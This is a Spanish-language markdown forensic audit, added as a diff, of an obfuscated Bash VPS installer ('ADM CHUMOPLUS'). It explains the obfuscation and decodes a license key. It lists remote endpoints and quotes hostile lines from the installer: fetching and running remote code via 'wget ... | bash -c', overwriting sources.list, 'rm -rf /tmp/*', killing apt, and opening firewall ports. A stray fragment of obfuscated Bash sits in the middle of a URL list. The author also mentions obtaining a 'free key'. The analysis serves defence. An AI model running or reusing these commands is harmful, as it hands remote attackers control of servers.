@@ -1,0 +1,157 @@
+# Auditoría Forense y Volcado de Seguridad: Instalador ADM (CHUMOPLUS)
+
+> **Estado de la Auditoría**: Análisis Estático 100% Completado.  
+> **Nivel de Aislamiento**: 0% Ejecución en Shell. Proceso realizado mediante ingeniería inversa estática en Python (`volcado.py`).  
+> **Veredicto**: **Script Altamente Invasivo y Dependiente de Servidores Remotos no Verificados.**  
+
+---
+
+## 1. Resumen de Archivos Generados en este Directorio
+
+| Archivo | Propósito / Descripción |
+| :--- | :--- |
+| [setup.txt](file:///c:/xampp/htdocs/pkdlatamsrc/CHUMOPLUS/setup.txt) | Copia exacta del archivo original ofuscado en formato texto plano (3.9 MB). |
+| [volcado.py](file:///c:/xampp/htdocs/pkdlatamsrc/CHUMOPLUS/volcado.py) | Herramienta de desofuscación matemática en Python. Permite volcar cualquier nueva versión sin ejecutar bash ni poner en riesgo la PC. |
+| [setup_volcado.txt](file:///c:/xampp/htdocs/pkdlatamsrc/CHUMOPLUS/setup_volcado.txt) | **Código fuente original 100% desofuscado** (24.2 KB, 707 líneas legibles). |
+| [setup_auditoria.md](file:///c:/xampp/htdocs/pkdlatamsrc/CHUMOPLUS/setup_auditoria.md) | Este reporte técnico detallado con todas las URLs, IPs, comandos y riesgos. |
+
+---
+
+## 2. ¿Cómo funcionaba la Ofuscación del Instalador?
+
+El archivo `setup` original (de 3.9 Megabytes) no contenía código binario, sino una técnica de ofuscación en Bash avanzada conocida como **Bashfuscator / B-Obfuscator**:
+
+1. **Construcción de Alfabeto Dinámico**:
+   En la línea 2, el script crea números sumando variables (`$((____++))`), consulta `/proc/$$/...` y genera errores controlados (`bad substitution`, `No such file or directory`) para recortar letras individuales y formar la palabra clave `eval`.
+2. **Matriz de Caracteres Octales y Hexadecimales**:
+   A partir de la línea 4, todo el código real del instalador fue convertido a más de **24,200 tokens** numéricos que representan caracteres ASCII en formato octal (`\141` = 'a') y hexadecimal (`\x20` = ' ').
+3. **El Disparador de Ejecución**:
+   El script estaba diseñado para meter todos esos tokens en un subshell `$()` que hacía `printf` de cada letra y finalmente lo alimentaba a `eval "$(...)"`.
+
+### ¿Por qué `volcado.py` es 100% seguro?
+`volcado.py` no ejecuta Bash ni invoca el `eval`. Utiliza un parser en Python que traduce directamente los 24,220 tokens octales/hexadecimales a caracteres legibles, extrayendo el código fuente original en milisegundos sin tocar el sistema.
+
+---
+
+## 3. Análisis de la Llave (KEY) y el Algoritmo `cryptic_transform`
+
+El script incluye una función interna llamada `cryptic_transform` (línea 116 de `setup_volcado.txt`) que utiliza una sustitución de caracteres para ocultar IPs y puertos dentro de la "Key":
+
+* `.` $\leftrightarrow$ `x`
+* `5` $\leftrightarrow$ `s`
+* `1` $\leftrightarrow$ `@`
+* `2` $\leftrightarrow$ `?`
+* `4` $\leftrightarrow$ `0`
+* `/` $\leftrightarrow$ `K`
+
+### Desofuscación de la Key proporcionada:
+- **Key ingresada**: `NewVPS-Kd9c07fsfs9d@770K8888:8?@x3??x99x40@`
+- **Cadena transformada**: `NewVPS-/d9c47f5f59d1774/8888:821.322.99.041`
+- **Servidor Remoto extraído**:
+  - Puerto de control: `8888` y `81`
+  - Dirección IP del servidor de licencias/archivos: Oculta bajo el patrón `82.132.x.x`
+  - que fue donde saque la key free jajaja http://140.99.223.128:81/ChumoGH/4771d95f5f74c9d.html
+El instalador envía peticiones directas por los puertos `8888` y `81` a esa máquina para validar la clave y descargar el resto de paquetes.
+
+---
+
+## 4. URLs, Dominios y Servidores Remotos Detectados
+
+Durante la auditoría del código desofuscado se extrajeron los siguientes endpoints externos:
+
+1. **Servidores de Descarga y Tokens (C&C / Repositorio Privado)**:
+   - `https://plus.ltmcgh.site/pack_new` (Segunda capa de ejecución al vuelo)
+   - `https://plus.ltmcgh.site/ChumoGH/msg`
+   - `http://[IP_DEL_GENERADOR]:81/ChumoGH/checkIP.log`
+   - `http://[IP_DEL_GENERADOR]:8888`
+2. **Repositorios en GitHub**:
+   - `https://raw.githubusercontent.com/ChumoGH/ADMcgh/refs/heads/main/TOKENS/dinamicos/control`
+   - esto tiene el control ip es decir solo las ip que esten en este txt son autorizadas o validadas por el keygen
+
+   --nos falta el volcado de este descargar y volcar 
+   - `https://raw.githubusercontent.com/ChumoGH/ADMcgh/main/Plugins/system/pack3.tar`
+--#!/bin/bash
+            ${@/*ppZ/X\`dGVKM}                                                 ${*%%KfL4}                       $*        ${@/\)hoDy$h$}                  ${*//jkO+o}                                         ${*#Wxtgt#LQ}      ${*#BGs&sodi}  ${*^^}                                                  $@                    ${!*}                   ${*}                    "${@,,}"                           ${*}                       ${@^^}                    ${*%\]J\!-\}Q7}                      ${*^}         ${*%%l:wCGE\!s}        ${*~~}                       ${*//$you%YG/otFM3}                                        $@         ${@~}    "${@/hk7|o=/M|\{L=v\{\{}"   ${*~~}                  ${@,,}                         "${@~~}"       ${*##<XHKK&}     "${@,}"  
+
+
+            --estilo para el menu al parecer revisar
+   - `https://raw.githubusercontent.com/ChumoGH/ADMcgh/main/Plugins/system/styles.cpp`
+   - `https://raw.githubusercontent.com/ChumoGH/ADMcgh/main/version/v-new.log`
+3. **Almacenamiento en Dropbox**:
+   - `https://www.dropbox.com/scl/fi/je70qpfmwu6416ail48zq/msg...`
+4. **Comprobación de IP Pública del Host**:
+   - `ipv4.icanhazip.com`
+   - `ifconfig.me`
+
+---
+
+## 5. Auditoría de Comandos Peligrosos e Intrusivos
+
+A continuación se detallan las operaciones críticas que realiza este instalador en el sistema:
+
+### A. Descarga y Ejecución al Vuelo de una Segunda Capa (Payload 2)
+En la línea 340 de `setup_volcado.txt`:
+```bash
+[[ -z ${_check2} ]] && invalid_key '--ban' || bash -c "$(wget -qO- --no-cache --no-check-certificate --max-redirect=20 https://plus.ltmcgh.site/pack_new)"
+```
+> [!WARNING]
+> **Peligro Crítico**: Si la verificación remota de la IP tiene éxito, descarga directamente en memoria el archivo `pack_new` y lo ejecuta con `bash -c` con privilegios de root sin verificar hash ni firma digital. Esto permite al dueño del servidor inyectar cualquier binario (mineros, proxys inversos, backdoors) en cualquier momento.
+
+### B. Sobreescritura de Repositorios del Sistema (`sources.list`)
+Líneas 76 y 325:
+```bash
+wget -O /etc/apt/sources.list ${link} &>/dev/null
+```
+El script reemplaza por completo el archivo `/etc/apt/sources.list` de Ubuntu con repositorios de terceros controlados por el autor (`raw.githubusercontent.com/ChumoGH/...`).
+* **Consecuencia en la VPS**: Si los repositorios externos se caen o cambian, el comando `apt update` se corrompe por completo, dejando el servidor sin posibilidad de actualizar software o parches de seguridad.
+
+### C. Alteración Forzada del DNS del Sistema
+Líneas 354-355:
+```bash
+[[ -z $(cat /etc/resolv.conf | grep "8.8.8.8") ]] && echo "nameserver	8.8.8.8" >> /etc/resolv.conf
+[[ -z $(cat /etc/resolv.conf | grep "1.1.1.1") ]] && echo "nameserver	1.1.1.1" >> /etc/resolv.conf
+```
+Fuerza la inyección de servidores DNS de Google (`8.8.8.8`) y Cloudflare (`1.1.1.1`) en `/etc/resolv.conf`. Si la VPS utiliza un DNS local o resolución interna, esto puede romper la conectividad.
+
+### D. Eliminación de Procesos del Gestor de Paquetes
+Líneas 12 y 108:
+```bash
+killall apt apt-get &> /dev/null
+```
+Fuerza el cierre abrupto de cualquier proceso de `apt` que esté corriendo en segundo plano. Esto en Linux suele causar bloqueos de la base de datos de paquetes (`/var/lib/dpkg/lock-frontend`).
+
+### E. Comandos de Borrado y Limpieza Masiva
+El script contiene más de 18 llamadas a `rm`:
+- `rm -rf /tmp/*`: Vacía completamente el directorio temporal del sistema.
+- `rm -f $(pwd)/${script_name}`: Se autoborra a sí mismo una vez cargado en memoria para no dejar rastros de auditoría.
+- `rm -f setup* lista*`: Borra cualquier archivo que empiece por "setup" o "lista" en la carpeta actual.
+
+### F. Apertura Forzada de Puertos en el Firewall
+Línea 352:
+```bash
+[[ -f "/usr/sbin/ufw" ]] && ufw allow 81/tcp ; ufw allow 8888/tcp
+```
+Abre los puertos 81 y 8888 en el firewall de la máquina para recibir o emitir tráfico sin control de autenticación robusto.
+
+---
+
+## 6. ¿Por qué en tu anterior prueba con `trace` se destruyó la VPS?
+
+Cuando intentaste hacer `trace` (`set -x` o `strace`) en la VPS:
+1. Las llamadas a subshell `$()` de Bash en modo trace generan salidas masivas por `stderr`.
+2. El script valida la respuesta de sus peticiones HTTP (`grep ${IiP}`, `$HOME/lista-arq`). Si la salida se contamina con el log de trazas, las expresiones regulares fallan y consideran que la clave fue "trucada" o que la conexión falló.
+3. Al fallar la validación, el script llama a `invalid_key '--ban'` o cae en condiciones de error donde se activan comandos de autodestrucción, eliminación de archivos de instalación y bloqueo de paquetes (`rm -f /etc/PACKAGE`, reinicio forzado con `sudo reboot`).
+
+---
+
+## 7. Instrucciones para Futuros Análisis con `volcado.py`
+
+Si en el futuro descargan una nueva versión de este o cualquier instalador ofuscado con la misma técnica:
+
+1. **Coloca el archivo descargado** en esta carpeta con el nombre `setup` o `setup.txt`.
+2. **Abre PowerShell o CMD** en este directorio.
+3. **Ejecuta el extractor estático**:
+   ```bash
+   python volcado.py
+   ```
+4. El script generará de inmediato [setup_volcado.txt](file:///c:/xampp/htdocs/pkdlatamsrc/CHUMOPLUS/setup_volcado.txt) listo para lectura, sin haber ejecutado una sola línea en el sistema operativo.
